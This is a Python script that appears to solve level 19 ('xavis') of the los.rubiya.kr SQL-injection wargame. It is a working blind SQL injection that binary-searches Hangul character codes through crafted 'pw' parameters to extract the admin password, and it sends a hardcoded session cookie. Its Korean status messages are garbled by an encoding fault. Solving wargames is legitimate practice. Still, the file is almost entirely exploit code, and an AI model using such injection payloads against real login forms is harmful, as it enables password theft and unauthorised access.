import requests

def send(param):
    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url=url+param
    res=requests.get(my_url, cookies=head)
    return res.text

print("π LoS 19λ₯Ό μμν©λλ€")

ans = ""
endpoint = False

for len in range(1, 30):
    if(endpoint):
        break
    print(f"{len}λ²μ§Έ λ¬Έμμ λν΄ κ²μν©λλ€..")
    start = 44032
    end = 55203
    while True:
        if(endpoint):
            print(f"{len}λ²μ§Έ λ¬Έμλ μ‘΄μ¬νμ§ μμ΅λλ€.")
            print(f"π pwμ μ μ²΄λ [{ans}]μλλ€!")
            break
        if(start==end):
            endpoint = True
        middle = round((start+end)/2)
        param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))>={middle} %23"
        if("Hello admin" in send(param)):
            param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))={middle} %23"
            if("Hello admin" in send(param)):
                print(f"{len}λ²μ§Έ λ¬Έμμ μ­μ§μ β {middle}")
                ans += chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue
